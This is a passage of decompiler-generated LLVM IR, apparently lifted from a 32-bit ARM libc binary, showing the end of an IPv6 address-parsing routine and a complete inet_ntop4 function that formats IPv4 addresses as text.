dec_label_pc_1abdc:                               ; preds = %dec_label_pc_1abd0, %dec_label_pc_1abac
  %v0_1abe0 = phi i32 [ %v1_1abd0, %dec_label_pc_1abd0 ], [ %v0_1abbc, %dec_label_pc_1abac ]
  store i32 0, i32* %fp.global-to-local, align 4
  store i32 %v0_1abe0, i32* %sl.global-to-local, align 4
  store i32 0, i32* %r7.global-to-local, align 4
  %v1_1acbc7 = inttoptr i32 %v0_1abe0 to i8*
  %v2_1acbc8 = load i8, i8* %v1_1acbc7, align 1
  %v3_1acbc9 = zext i8 %v2_1acbc8 to i32
  store i32 %v3_1acbc9, i32* %r0.global-to-local, align 4
  %v1_1acc010 = call i32 @__GI_tolower(i32 %v3_1acbc9)
  store i32 %v1_1acc010, i32* %r0.global-to-local, align 4
  store i32 %v1_1acc010, i32* @r5, align 4
  %v2_1acc412 = icmp eq i32 %v1_1acc010, 0
  br i1 %v2_1acc412, label %dec_label_pc_1accc, label %dec_label_pc_1abf0

dec_label_pc_1abf0:                               ; preds = %dec_label_pc_1abdc, %dec_label_pc_1acbc.backedge
  %v0_1abf4 = phi i32 [ %v1_1acc0, %dec_label_pc_1acbc.backedge ], [ %v1_1acc010, %dec_label_pc_1abdc ]
  %stack_var_-56.013 = phi i8 [ %stack_var_-56.0.be, %dec_label_pc_1acbc.backedge ], [ 0, %dec_label_pc_1abdc ]
  store i32 ptrtoint ([17 x i8]* @global_var_1decc.1033 to i32), i32* %sb.global-to-local, align 4
  store i32 ptrtoint ([17 x i8]* @global_var_1decc.1033 to i32), i32* %r0.global-to-local, align 4
  %v3_1abfc = call i32 @__GI_strchr(i32 ptrtoint ([17 x i8]* @global_var_1decc.1033 to i32), i32 %v0_1abf4)
  %v4_1abfc = trunc i32 %v3_1abfc to i8
  store i32 %v3_1abfc, i32* %r0.global-to-local, align 4
  %v3_1ac00 = icmp eq i8 %v4_1abfc, 0
  %v0_1ac04 = load i32, i32* @r6, align 4
  %v1_1ac04 = add i32 %v0_1ac04, 1
  store i32 %v1_1ac04, i32* @r6, align 4
  br i1 %v3_1ac00, label %dec_label_pc_1ac20, label %dec_label_pc_1ac0c

dec_label_pc_1ac0c:                               ; preds = %dec_label_pc_1abf0
  %v0_1ac0c = load i32, i32* %sb.global-to-local, align 4
  %v2_1ac0c = sext i8 %v4_1abfc to i32
  %v3_1ac0c = sub i32 %v2_1ac0c, %v0_1ac0c
  store i32 %v3_1ac0c, i32* %r3.global-to-local, align 4
  %v1_1ac10 = load i32, i32* %r7.global-to-local, align 4
  %v4_1ac10 = mul i32 %v1_1ac10, 16
  %v5_1ac10 = or i32 %v4_1ac10, %v3_1ac0c
  store i32 %v5_1ac10, i32* %r7.global-to-local, align 4
  %v3_1ac18 = icmp ult i32 %v5_1ac10, 65534
  br i1 %v3_1ac18, label %dec_label_pc_1acb4, label %dec_label_pc_1ad70

dec_label_pc_1ac20:                               ; preds = %dec_label_pc_1abf0
  %v0_1ac20 = load i32, i32* @r5, align 4
  %v7_1ac20 = icmp eq i32 %v0_1ac20, 58
  br i1 %v7_1ac20, label %dec_label_pc_1ac28, label %dec_label_pc_1ac84

dec_label_pc_1ac28:                               ; preds = %dec_label_pc_1ac20
  %v4_1ac282 = zext i8 %stack_var_-56.013 to i32
  store i32 %v4_1ac282, i32* %r3.global-to-local, align 4
  %v2_1ac2c = icmp eq i8 %stack_var_-56.013, 0
  br i1 %v2_1ac2c, label %dec_label_pc_1ac34, label %dec_label_pc_1ac48

dec_label_pc_1ac34:                               ; preds = %dec_label_pc_1ac28
  %v0_1ac34 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ac34 = icmp eq i32 %v0_1ac34, 0
  br i1 %v2_1ac34, label %dec_label_pc_1ac3c, label %dec_label_pc_1ad70

dec_label_pc_1ac3c:                               ; preds = %dec_label_pc_1ac34
  %v0_1ac3c = load i32, i32* @r4, align 4
  store i32 %v0_1ac3c, i32* %fp.global-to-local, align 4
  store i32 %v1_1ac04, i32* %sl.global-to-local, align 4
  br label %dec_label_pc_1acbc.backedge

dec_label_pc_1ac48:                               ; preds = %dec_label_pc_1ac28
  %v1_1ac48 = inttoptr i32 %v1_1ac04 to i8*
  %v2_1ac48 = load i8, i8* %v1_1ac48, align 1
  %v3_1ac48 = zext i8 %v2_1ac48 to i32
  store i32 %v3_1ac48, i32* %r3.global-to-local, align 4
  %v2_1ac4c = icmp eq i8 %v2_1ac48, 0
  br i1 %v2_1ac4c, label %dec_label_pc_1ad70, label %dec_label_pc_1ac54

dec_label_pc_1ac54:                               ; preds = %dec_label_pc_1ac48
  %v0_1ac54 = load i32, i32* @r4, align 4
  %v1_1ac54 = add i32 %v0_1ac54, 2
  store i32 %v1_1ac54, i32* %r3.global-to-local, align 4
  %v1_1ac58 = load i32, i32* %r8.global-to-local, align 4
  %tmp38 = icmp ugt i32 %v1_1ac54, %v1_1ac58
  br i1 %tmp38, label %dec_label_pc_1ad70, label %dec_label_pc_1ac60

dec_label_pc_1ac60:                               ; preds = %dec_label_pc_1ac54
  %v0_1ac60 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ac60 = udiv i32 %v0_1ac60, 256
  store i32 %v3_1ac60, i32* %r2.global-to-local, align 4
  store i32 %v0_1ac54, i32* %r3.global-to-local, align 4
  %v1_1ac68 = trunc i32 %v3_1ac60 to i8
  %v3_1ac68 = inttoptr i32 %v0_1ac54 to i8*
  store i8 %v1_1ac68, i8* %v3_1ac68, align 1
  %v4_1ac68 = load i32, i32* %r3.global-to-local, align 4
  %v5_1ac68 = add i32 %v4_1ac68, 1
  store i32 %v5_1ac68, i32* %r3.global-to-local, align 4
  %v0_1ac6c = load i32, i32* @r6, align 4
  store i32 %v0_1ac6c, i32* %sl.global-to-local, align 4
  %v0_1ac70 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ac70 = trunc i32 %v0_1ac70 to i8
  %v2_1ac70 = load i32, i32* @r4, align 4
  %v3_1ac70 = add i32 %v2_1ac70, 1
  %v4_1ac70 = inttoptr i32 %v3_1ac70 to i8*
  store i8 %v1_1ac70, i8* %v4_1ac70, align 1
  store i32 0, i32* %r7.global-to-local, align 4
  %v0_1ac78 = load i32, i32* %r3.global-to-local, align 4
  %v1_1ac78 = add i32 %v0_1ac78, 1
  store i32 %v1_1ac78, i32* @r4, align 4
  %v0_1acbc.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_1acbc.backedge

dec_label_pc_1ac84:                               ; preds = %dec_label_pc_1ac20
  %v7_1ac84 = icmp eq i32 %v0_1ac20, 46
  br i1 %v7_1ac84, label %dec_label_pc_1ac8c, label %dec_label_pc_1ad70

dec_label_pc_1ac8c:                               ; preds = %dec_label_pc_1ac84
  %v0_1ac8c = load i32, i32* @r4, align 4
  %v1_1ac8c = add i32 %v0_1ac8c, 4
  store i32 %v1_1ac8c, i32* @r5, align 4
  %v1_1ac90 = load i32, i32* %r8.global-to-local, align 4
  %tmp39 = icmp ugt i32 %v1_1ac8c, %v1_1ac90
  br i1 %tmp39, label %dec_label_pc_1ad70, label %dec_label_pc_1ac98

dec_label_pc_1ac98:                               ; preds = %dec_label_pc_1ac8c
  %v0_1ac9c = load i32, i32* %sl.global-to-local, align 4
  %v1_1ac9c = inttoptr i32 %v0_1ac9c to i8*
  store i32 %v0_1ac9c, i32* %r0.global-to-local, align 4
  %v4_1aca0 = call i32 @inet_pton4(i8* %v1_1ac9c, i32 %v0_1ac8c)
  store i32 %v4_1aca0, i32* %r0.global-to-local, align 4
  %tmp36 = icmp slt i32 %v4_1aca0, 1
  br i1 %tmp36, label %dec_label_pc_1ad70, label %bb

bb:                                               ; preds = %dec_label_pc_1ac98
  %v5_1aca8 = load i32, i32* @r5, align 4
  store i32 %v5_1aca8, i32* @r4, align 4
  br label %dec_label_pc_1acf8

dec_label_pc_1acb4:                               ; preds = %dec_label_pc_1ac0c
  store i32 1, i32* %r3.global-to-local, align 4
  br label %dec_label_pc_1acbc.backedge

dec_label_pc_1acbc.backedge:                      ; preds = %dec_label_pc_1acb4, %dec_label_pc_1ac3c, %dec_label_pc_1ac60
  %v0_1acbc = phi i32 [ %v1_1ac04, %dec_label_pc_1ac3c ], [ %v0_1acbc.pre, %dec_label_pc_1ac60 ], [ %v1_1ac04, %dec_label_pc_1acb4 ]
  %stack_var_-56.0.be = phi i8 [ 0, %dec_label_pc_1ac3c ], [ 0, %dec_label_pc_1ac60 ], [ 1, %dec_label_pc_1acb4 ]
  %v1_1acbc = inttoptr i32 %v0_1acbc to i8*
  %v2_1acbc = load i8, i8* %v1_1acbc, align 1
  %v3_1acbc = zext i8 %v2_1acbc to i32
  store i32 %v3_1acbc, i32* %r0.global-to-local, align 4
  %v1_1acc0 = call i32 @__GI_tolower(i32 %v3_1acbc)
  store i32 %v1_1acc0, i32* %r0.global-to-local, align 4
  store i32 %v1_1acc0, i32* @r5, align 4
  %v2_1acc4 = icmp eq i32 %v1_1acc0, 0
  br i1 %v2_1acc4, label %dec_label_pc_1accc, label %dec_label_pc_1abf0

dec_label_pc_1accc:                               ; preds = %dec_label_pc_1acbc.backedge, %dec_label_pc_1abdc
  %stack_var_-56.0.lcssa = phi i8 [ 0, %dec_label_pc_1abdc ], [ %stack_var_-56.0.be, %dec_label_pc_1acbc.backedge ]
  %v4_1accc3 = zext i8 %stack_var_-56.0.lcssa to i32
  store i32 %v4_1accc3, i32* %r3.global-to-local, align 4
  %v2_1acd0 = icmp eq i8 %stack_var_-56.0.lcssa, 0
  %v0_1ad3c.pre.pre = load i32, i32* @r4, align 4
  br i1 %v2_1acd0, label %dec_label_pc_1acf8, label %dec_label_pc_1acd8

dec_label_pc_1acd8:                               ; preds = %dec_label_pc_1accc
  %v1_1acd8 = add i32 %v0_1ad3c.pre.pre, 2
  store i32 %v1_1acd8, i32* %r3.global-to-local, align 4
  %v1_1acdc = load i32, i32* %r8.global-to-local, align 4
  %tmp40 = icmp ugt i32 %v1_1acd8, %v1_1acdc
  br i1 %tmp40, label %dec_label_pc_1ad70, label %dec_label_pc_1ace4

dec_label_pc_1ace4:                               ; preds = %dec_label_pc_1acd8
  store i32 %v0_1ad3c.pre.pre, i32* %r3.global-to-local, align 4
  %v0_1ace8 = load i32, i32* %r7.global-to-local, align 4
  %v3_1ace8 = udiv i32 %v0_1ace8, 256
  store i32 %v3_1ace8, i32* %r2.global-to-local, align 4
  %v1_1acec = trunc i32 %v3_1ace8 to i8
  %v3_1acec = inttoptr i32 %v0_1ad3c.pre.pre to i8*
  store i8 %v1_1acec, i8* %v3_1acec, align 1
  %v4_1acec = load i32, i32* %r3.global-to-local, align 4
  %v5_1acec = add i32 %v4_1acec, 1
  store i32 %v5_1acec, i32* %r3.global-to-local, align 4
  %v0_1acf0 = load i32, i32* %r7.global-to-local, align 4
  %v1_1acf0 = trunc i32 %v0_1acf0 to i8
  %v2_1acf0 = load i32, i32* @r4, align 4
  %v3_1acf0 = add i32 %v2_1acf0, 1
  %v4_1acf0 = inttoptr i32 %v3_1acf0 to i8*
  store i8 %v1_1acf0, i8* %v4_1acf0, align 1
  %v0_1acf4 = load i32, i32* %r3.global-to-local, align 4
  %v1_1acf4 = add i32 %v0_1acf4, 1
  store i32 %v1_1acf4, i32* @r4, align 4
  br label %dec_label_pc_1acf8

dec_label_pc_1acf8:                               ; preds = %dec_label_pc_1accc, %bb, %dec_label_pc_1ace4
  %v0_1ad3c.pre = phi i32 [ %v5_1aca8, %bb ], [ %v1_1acf4, %dec_label_pc_1ace4 ], [ %v0_1ad3c.pre.pre, %dec_label_pc_1accc ]
  %v0_1acf8 = load i32, i32* %fp.global-to-local, align 4
  %v2_1acf8 = icmp eq i32 %v0_1acf8, 0
  %v1_1ad3c.pre = load i32, i32* %r8.global-to-local, align 4
  br i1 %v2_1acf8, label %dec_label_pc_1ad3c, label %dec_label_pc_1ad00

dec_label_pc_1ad00:                               ; preds = %dec_label_pc_1acf8
  %v9_1ad00 = icmp eq i32 %v0_1ad3c.pre, %v1_1ad3c.pre
  %v2_1ad04 = sub i32 %v0_1ad3c.pre, %v0_1acf8
  store i32 %v2_1ad04, i32* %r0.global-to-local, align 4
  br i1 %v9_1ad00, label %dec_label_pc_1ad70, label %dec_label_pc_1ad24.preheader

dec_label_pc_1ad24.preheader:                     ; preds = %dec_label_pc_1ad00
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ad24

dec_label_pc_1ad14:                               ; preds = %dec_label_pc_1ad24
  %v0_1ad14 = load i32, i32* %fp.global-to-local, align 4
  %v2_1ad14 = add i32 %v0_1ad14, %v2_1ad28
  %v3_1ad14 = inttoptr i32 %v2_1ad14 to i8*
  %v4_1ad14 = load i8, i8* %v3_1ad14, align 1
  %v3_1ad18 = inttoptr i32 %v2_1ad2c to i8*
  store i8 %v4_1ad14, i8* %v3_1ad18, align 1
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1ad20 = load i32, i32* %fp.global-to-local, align 4
  %v3_1ad20 = load i32, i32* %ip.global-to-local, align 4
  %v4_1ad20 = add i32 %v3_1ad20, %v2_1ad20
  %v5_1ad20 = inttoptr i32 %v4_1ad20 to i8*
  store i8 0, i8* %v5_1ad20, align 1
  %v0_1ad24.pre = load i32, i32* %r2.global-to-local, align 4
  %v1_1ad24.pre = load i32, i32* %r0.global-to-local, align 4
  %v1_1ad2c.pre = load i32, i32* %r8.global-to-local, align 4
  br label %dec_label_pc_1ad24

dec_label_pc_1ad24:                               ; preds = %dec_label_pc_1ad24.preheader, %dec_label_pc_1ad14
  %v0_1ad38 = phi i32 [ %v1_1ad3c.pre, %dec_label_pc_1ad24.preheader ], [ %v1_1ad2c.pre, %dec_label_pc_1ad14 ]
  %v1_1ad28 = phi i32 [ %v2_1ad04, %dec_label_pc_1ad24.preheader ], [ %v1_1ad24.pre, %dec_label_pc_1ad14 ]
  %v0_1ad30 = phi i32 [ 1, %dec_label_pc_1ad24.preheader ], [ %v0_1ad24.pre, %dec_label_pc_1ad14 ]
  %v2_1ad28 = sub i32 %v1_1ad28, %v0_1ad30
  store i32 %v2_1ad28, i32* %ip.global-to-local, align 4
  %v2_1ad2c = sub i32 %v0_1ad38, %v0_1ad30
  store i32 %v2_1ad2c, i32* @lr, align 4
  %v1_1ad30 = add i32 %v0_1ad30, 1
  store i32 %v1_1ad30, i32* %r2.global-to-local, align 4
  %v7_1ad34 = icmp slt i32 %v1_1ad28, %v0_1ad30
  br i1 %v7_1ad34, label %dec_label_pc_1ad38, label %dec_label_pc_1ad14

dec_label_pc_1ad38:                               ; preds = %dec_label_pc_1ad24
  store i32 %v0_1ad38, i32* @r4, align 4
  br label %dec_label_pc_1ad3c

dec_label_pc_1ad3c:                               ; preds = %dec_label_pc_1acf8, %dec_label_pc_1ad38
  %v0_1ad3c = phi i32 [ %v0_1ad38, %dec_label_pc_1ad38 ], [ %v0_1ad3c.pre, %dec_label_pc_1acf8 ]
  %v1_1ad3c = phi i32 [ %v0_1ad38, %dec_label_pc_1ad38 ], [ %v1_1ad3c.pre, %dec_label_pc_1acf8 ]
  %v9_1ad3c = icmp eq i32 %v0_1ad3c, %v1_1ad3c
  br i1 %v9_1ad3c, label %dec_label_pc_1ad44, label %dec_label_pc_1ad70

dec_label_pc_1ad44:                               ; preds = %dec_label_pc_1ad3c
  store i32 16, i32* @r2, align 4
  %v2_1ad48 = load i32, i32* %stack_var_-60, align 4
  store i32 %v2_1ad48, i32* @r0, align 4
  store i32 %v2_1abac, i32* @r1, align 4
  %v0_1ad50 = call i32 @memcpy()
  store i32 %v0_1ad50, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ad74

dec_label_pc_1ad5c:                               ; preds = %dec_label_pc_1ab8c
  %v0_1ad5c = call i32 @__errno_location()
  store i32 %v0_1ad5c, i32* %r0.global-to-local, align 4
  store i32 97, i32* %r3.global-to-local, align 4
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1ad68 = inttoptr i32 %v0_1ad5c to i32*
  store i32 97, i32* %v2_1ad68, align 4
  %v0_1ad74.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ad74

dec_label_pc_1ad70:                               ; preds = %dec_label_pc_1ac0c, %dec_label_pc_1ac34, %dec_label_pc_1ac54, %dec_label_pc_1ac48, %dec_label_pc_1ac98, %dec_label_pc_1ad00, %dec_label_pc_1ac84, %dec_label_pc_1ad3c, %dec_label_pc_1abd0, %dec_label_pc_1acd8, %dec_label_pc_1ac8c
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ad74

dec_label_pc_1ad74:                               ; preds = %dec_label_pc_1ad5c, %dec_label_pc_1ad44, %dec_label_pc_1ab98, %dec_label_pc_1ad70
  %v0_1ad74 = phi i32 [ %v0_1ad74.pre, %dec_label_pc_1ad5c ], [ 1, %dec_label_pc_1ad44 ], [ %v4_1aba0, %dec_label_pc_1ab98 ], [ 0, %dec_label_pc_1ad70 ]
  store i32 %v0_1ad74, i32* %r0.global-to-local, align 4
  store i32 %v3_1ab74, i32* @r4, align 4
  store i32 %v6_1ab74, i32* @r5, align 4
  store i32 %v9_1ab74, i32* @r6, align 4
  ret i32 %v0_1ad74

; uselistorder directives
  uselistorder i32 %v0_1ad74, { 1, 0 }
  uselistorder i32 %v2_1ad2c, { 1, 0 }
  uselistorder i32 %v2_1ad28, { 1, 0 }
  uselistorder i32 %v0_1ad30, { 0, 1, 3, 2 }
  uselistorder i32 %v0_1ad38, { 1, 0, 2, 3 }
  uselistorder i32 %v1_1ad3c.pre, { 0, 2, 1 }
  uselistorder i32 %v0_1ad3c.pre, { 2, 0, 1 }
  uselistorder i32 %v3_1ace8, { 1, 0 }
  uselistorder i32 %v0_1ad3c.pre.pre, { 0, 3, 2, 1 }
  uselistorder i32 %v1_1acc0, { 1, 2, 3, 0 }
  uselistorder i32 %v0_1ac9c, { 1, 0 }
  uselistorder i32 %v3_1ac60, { 1, 0 }
  uselistorder i32 %v0_1ac54, { 1, 0, 2 }
  uselistorder i32 %v1_1ac04, { 0, 1, 3, 2, 4 }
  uselistorder i32 %v3_1abfc, { 1, 0 }
  uselistorder i32 %v0_1abe0, { 1, 0 }
  uselistorder i32* %sl.global-to-local, { 2, 0, 1, 3 }
  uselistorder i32* %r8.global-to-local, { 0, 4, 1, 2, 3, 5 }
  uselistorder i32* %r7.global-to-local, { 2, 3, 0, 4, 5, 1, 6, 7 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 5, 6, 4, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 4, 6, 5, 7, 8, 9, 10, 0 }
  uselistorder i32* %r0.global-to-local, { 3, 4, 7, 5, 6, 13, 12, 9, 8, 11, 10, 2, 1, 14, 16, 15, 0 }
  uselistorder i32* %ip.global-to-local, { 1, 0 }
  uselistorder i32* %fp.global-to-local, { 1, 2, 3, 0, 4, 5 }
  uselistorder i32 (i32)* @__GI_tolower, { 1, 0 }
  uselistorder label %dec_label_pc_1ad74, { 3, 0, 1, 2 }
  uselistorder label %dec_label_pc_1ad70, { 7, 5, 9, 4, 10, 6, 2, 3, 1, 0, 8 }
  uselistorder label %dec_label_pc_1ad3c, { 1, 0 }
  uselistorder label %dec_label_pc_1ad24, { 1, 0 }
  uselistorder label %dec_label_pc_1acf8, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1acbc.backedge, { 0, 2, 1 }
  uselistorder label %dec_label_pc_1abf0, { 1, 0 }
}

define i32 @inet_ntop4(i32 %arg1, i32 %arg2, i32 %arg3) local_unnamed_addr {
entry:
  %fp.global-to-local = alloca i32, align 4
  %ip.global-to-local = alloca i32, align 4
  %r1.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %r7.global-to-local = alloca i32, align 4
  %r8.global-to-local = alloca i32, align 4
  %sb.global-to-local = alloca i32, align 4
  %sl.global-to-local = alloca i32, align 4
  store i32 %arg3, i32* %r2.global-to-local, align 4
  store i32 %arg2, i32* %r1.global-to-local, align 4
  %stack_var_-51 = alloca i32, align 4
  %stack_var_-53 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-36 = alloca i32, align 4
  %v3_1ad84 = load i32, i32* @r4, align 4
  store i32 %v3_1ad84, i32* %stack_var_-36, align 4
  store i32 %arg3, i32* %stack_var_-64, align 4
  store i32 ptrtoint (i32* @global_var_1deb8.1035 to i32), i32* @r1, align 4
  store i32 2, i32* @r2, align 4
  store i32 %arg1, i32* %fp.global-to-local, align 4
  %v2_1ada0 = ptrtoint i32* %stack_var_-53 to i32
  store i32 %v2_1ada0, i32* @r0, align 4
  %v0_1ada4 = call i32 @memcpy()
  %v2_1ada8 = ptrtoint i32* %stack_var_-51 to i32
  store i32 %v2_1ada8, i32* @r0, align 4
  store i32 0, i32* @r1, align 4
  store i32 15, i32* @r2, align 4
  %v0_1adb4 = call i32 @__GI_memset()
  store i32 0, i32* %r8.global-to-local, align 4
  %v2_1ae7c = ptrtoint i32* %stack_var_-36 to i32
  %v2_1ae58 = add i32 %v2_1ae7c, -17
  br label %dec_label_pc_1ae7c

dec_label_pc_1adc4:                               ; preds = %dec_label_pc_1ae7c
  %v0_1adc4 = load i32, i32* %fp.global-to-local, align 4
  %v2_1adc4 = add i32 %v0_1adc4, %v1_1adc4
  %v3_1adc4 = inttoptr i32 %v2_1adc4 to i8*
  %v4_1adc4 = load i8, i8* %v3_1adc4, align 1
  %v6_1adc4 = zext i8 %v4_1adc4 to i32
  store i32 %v6_1adc4, i32* %r4.global-to-local, align 4
  %v1_1adc8 = add i32 %v0_1adc8, 1
  store i32 %v1_1adc8, i32* %r7.global-to-local, align 4
  store i32 %v2_1ae7c, i32* %r2.global-to-local, align 4
  %v2_1add4 = add i32 %v1_1adc8, %v2_1ae7c
  store i32 %v2_1add4, i32* %sl.global-to-local, align 4
  %div = udiv i8 %v4_1adc4, 100
  %v1_1addc = or i8 %div, 48
  %v3_1ade0 = add i32 %v2_1ae8c, -17
  %v4_1ade0 = inttoptr i32 %v3_1ade0 to i8*
  store i8 %v1_1addc, i8* %v4_1ade0, align 1
  %v0_1ade4 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ade4 = add i32 %v0_1ade4, -17
  %v2_1ade4 = inttoptr i32 %v1_1ade4 to i8*
  %v3_1ade4 = load i8, i8* %v2_1ade4, align 1
  %v7_1ade8 = icmp eq i8 %v3_1ade4, 48
  %v0_1adec = load i32, i32* %fp.global-to-local, align 4
  %v1_1adec = load i32, i32* %r8.global-to-local, align 4
  %v2_1adec = add i32 %v1_1adec, %v0_1adec
  store i32 %v2_1adec, i32* %sb.global-to-local, align 4
  %v0_1adf4 = load i32, i32* %r4.global-to-local, align 4
  %v2_1adfc = udiv i32 %v0_1adf4, 10
  store i32 10, i32* %r1.global-to-local, align 4
  %v1_1ae04 = urem i32 %v2_1adfc, 256
  %v2_1ae08 = urem i32 %v1_1ae04, 10
  %v1_1ae0c = or i32 %v2_1ae08, 48
  %v1_1ae10 = trunc i32 %v1_1ae0c to i8
  br i1 %v7_1ade8, label %dec_label_pc_1adfc, label %dec_label_pc_1ae24

dec_label_pc_1adfc:                               ; preds = %dec_label_pc_1adc4
  store i8 %v1_1ae10, i8* %v2_1ade4, align 1
  %v0_1ae14 = load i32, i32* %r5.global-to-local, align 4
  %v1_1ae14 = add i32 %v0_1ae14, -17
  %v2_1ae14 = inttoptr i32 %v1_1ae14 to i8*
  %v3_1ae14 = load i8, i8* %v2_1ae14, align 1
  %v7_1ae18 = icmp eq i8 %v3_1ae14, 48
  br i1 %v7_1ae18, label %dec_label_pc_1adfc.dec_label_pc_1ae48_crit_edge, label %bb

dec_label_pc_1adfc.dec_label_pc_1ae48_crit_edge:  ; preds = %dec_label_pc_1adfc
  %v1_1ae58.pre = load i32, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ae48

bb:                                               ; preds = %dec_label_pc_1adfc
  %v1_1ae1c = load i32, i32* %r7.global-to-local, align 4
  store i32 %v1_1ae1c, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ae48

dec_label_pc_1ae24:                               ; preds = %dec_label_pc_1adc4
  %v2_1ae40 = load i32, i32* %sl.global-to-local, align 4
  %v3_1ae40 = add i32 %v2_1ae40, -17
  %v4_1ae40 = inttoptr i32 %v3_1ae40 to i8*
  store i8 %v1_1ae10, i8* %v4_1ae40, align 1
  %v0_1ae44 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ae44 = add i32 %v0_1ae44, 1
  store i32 %v1_1ae44, i32* %r6.global-to-local, align 4
  br label %dec_label_pc_1ae48

dec_label_pc_1ae48:                               ; preds = %dec_label_pc_1adfc.dec_label_pc_1ae48_crit_edge, %bb, %dec_label_pc_1ae24
  %v1_1ae58 = phi i32 [ %v1_1ae58.pre, %dec_label_pc_1adfc.dec_label_pc_1ae48_crit_edge ], [ %v1_1ae1c, %bb ], [ %v1_1ae44, %dec_label_pc_1ae24 ]
  %v0_1ae48 = load i32, i32* %sb.global-to-local, align 4
  %v1_1ae48 = inttoptr i32 %v0_1ae48 to i8*
  %v2_1ae48 = load i8, i8* %v1_1ae48, align 1
  %tmp17 = urem i8 %v2_1ae48, 10
  store i32 %v2_1ae7c, i32* %ip.global-to-local, align 4
  %v1_1ae5c = add i32 %v1_1ae58, 1
  store i32 %v1_1ae5c, i32* %r1.global-to-local, align 4
  %v1_1ae60 = or i8 %tmp17, 48
  %v3_1ae64 = add i32 %v2_1ae58, %v1_1ae58
  %v4_1ae64 = inttoptr i32 %v3_1ae64 to i8*
  store i8 %v1_1ae60, i8* %v4_1ae64, align 1
  %v0_1ae68 = load i32, i32* %ip.global-to-local, align 4
  %v1_1ae68 = load i32, i32* %r1.global-to-local, align 4
  %v2_1ae68 = add i32 %v1_1ae68, %v0_1ae68
  store i32 %v2_1ae68, i32* %r2.global-to-local, align 4
  %v3_1ae70 = add i32 %v2_1ae68, -17
  %v4_1ae70 = inttoptr i32 %v3_1ae70 to i8*
  store i8 46, i8* %v4_1ae70, align 1
  %v0_1ae74 = load i32, i32* %r8.global-to-local, align 4
  %v1_1ae74 = add i32 %v0_1ae74, 1
  store i32 %v1_1ae74, i32* %r8.global-to-local, align 4
  %v0_1ae78 = load i32, i32* %r1.global-to-local, align 4
  %v1_1ae78 = add i32 %v0_1ae78, 1
  br label %dec_label_pc_1ae7c

dec_label_pc_1ae7c:                               ; preds = %entry, %dec_label_pc_1ae48
  %v0_1adc8 = phi i32 [ 0, %entry ], [ %v1_1ae78, %dec_label_pc_1ae48 ]
  %v1_1adc4 = phi i32 [ 0, %entry ], [ %v1_1ae74, %dec_label_pc_1ae48 ]
  store i32 %v2_1ae7c, i32* %r2.global-to-local, align 4
  store i32 100, i32* %r1.global-to-local, align 4
  store i32 %v0_1adc8, i32* %r6.global-to-local, align 4
  %v2_1ae8c = add i32 %v0_1adc8, %v2_1ae7c
  store i32 %v2_1ae8c, i32* %r5.global-to-local, align 4
  %v7_1ae90 = icmp sgt i32 %v1_1adc4, 3
  br i1 %v7_1ae90, label %dec_label_pc_1ae94, label %dec_label_pc_1adc4

dec_label_pc_1ae94:                               ; preds = %dec_label_pc_1ae7c
  store i32 0, i32* %r6.global-to-local, align 4
  store i32 %v2_1ada0, i32* %r4.global-to-local, align 4
  %v3_1ae9c = add i32 %v2_1ae8c, -18
  %v4_1ae9c = inttoptr i32 %v3_1ae9c to i8*
  store i8 0, i8* %v4_1ae9c, align 1
  %tmp18 = bitcast i32* %stack_var_-53 to i8*
  %v3_1aea4 = call i32 @strlen(i8* %tmp18)
  %v2_1aea8 = load i32, i32* %stack_var_-64, align 4
  %tmp = icmp ugt i32 %v3_1aea4, %v2_1aea8
  br i1 %tmp, label %dec_label_pc_1aeb4, label %dec_label_pc_1aec8

dec_label_pc_1aeb4:                               ; preds = %dec_label_pc_1ae94
  %v0_1aeb4 = call i32 @__errno_location()
  %v0_1aebc = load i32, i32* %r6.global-to-local, align 4
  store i32 %v0_1aebc, i32* %r2.global-to-local, align 4
  %v2_1aec0 = inttoptr i32 %v0_1aeb4 to i32*
  store i32 28, i32* %v2_1aec0, align 4
  %v0_1aed8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aed8

dec_label_pc_1aec8:                               ; preds = %dec_label_pc_1ae94
  store i32 %v2_1ada0, i32* %r1.global-to-local, align 4
  %v3_1aed0 = call i32 @strcpy(i32 %arg2, i8* %tmp18)
  store i32 %v3_1aed0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1aed8

dec_label_pc_1aed8:                               ; preds = %dec_label_pc_1aeb4, %dec_label_pc_1aec8
  %v0_1aed8 = phi i32 [ %v0_1aed8.pre, %dec_label_pc_1aeb4 ], [ %v3_1aed0, %dec_label_pc_1aec8 ]
  %v2_1aee0 = load i32, i32* %stack_var_-36, align 4
  store i32 %v2_1aee0, i32* @r4, align 4
  ret i32 %v0_1aed8

; uselistorder directives
  uselistorder i32 %v2_1ae8c, { 0, 2, 1 }
  uselistorder i32 %v1_1adc4, { 1, 0 }
  uselistorder i32 %v0_1adc8, { 0, 2, 1 }
  uselistorder i32 %v2_1ae7c, { 0, 5, 3, 2, 4, 1 }
  uselistorder i32* %stack_var_-36, { 0, 2, 1 }
  uselistorder i32* %r6.global-to-local, { 0, 1, 5, 2, 3, 4 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r2.global-to-local, { 1, 2, 3, 6, 4, 5, 0 }
